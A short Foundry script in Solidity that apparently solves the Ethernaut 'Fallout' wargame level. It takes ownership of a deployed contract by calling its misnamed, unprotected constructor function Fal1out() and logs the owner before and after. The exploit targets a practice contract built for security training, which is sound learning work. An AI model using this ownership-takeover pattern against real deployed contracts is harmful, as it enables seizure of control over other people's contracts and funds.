// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallout} from "../src/levels/Fallout.sol";

contract FalloutScript is Script {
    Fallout public instance = Fallout(payable(0x7cA9b850165C446db03B2f4F9d556d4023C9dA31));

    function run() external {
        vm.startBroadcast();
        console.log("Current owner:", instance.owner());
        instance.Fal1out();
        console.log("New owner:", instance.owner());
        vm.stopBroadcast();
    }
}
